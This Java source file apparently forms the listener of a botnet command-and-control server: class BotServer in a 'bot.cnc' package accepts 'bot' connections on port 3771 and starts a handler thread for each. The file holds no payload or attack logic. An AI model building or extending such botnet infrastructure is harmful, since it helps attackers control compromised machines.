package xyz.terrific.server.bot.cnc;


import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;


/**
 * @author TerrificTable55
 * @version 1.0
 */
public class BotServer {
    private final ServerSocket socket;

    /**
     * @param socket sets private socket
     */
    public BotServer(ServerSocket socket) {
        this.socket = socket;
    }

    /**
     * @use Init function, creates a new ServerSocket and defines a new BotServer
     * @throws IOException
     */
    public static void init() throws IOException {

        ServerSocket bSocket        = new ServerSocket(3771);
        BotServer server            = new BotServer(bSocket);
        server.start();

    }

    /**
     * @use Starts the bot server
     */
    public void start() {
        try {
            while (!socket.isClosed()) {

                Socket conn = socket.accept();

                System.out.printf(" [ BOT | %s ] Connected\n", conn.getRemoteSocketAddress().toString());
                BotHandler handler = new BotHandler(conn);

                Thread thread = new Thread(handler);
                thread.start();
            }

        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    /**
     * @use closes socket
     */
    public void close() {

        try {
            if (socket != null)
                socket.close();
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

}
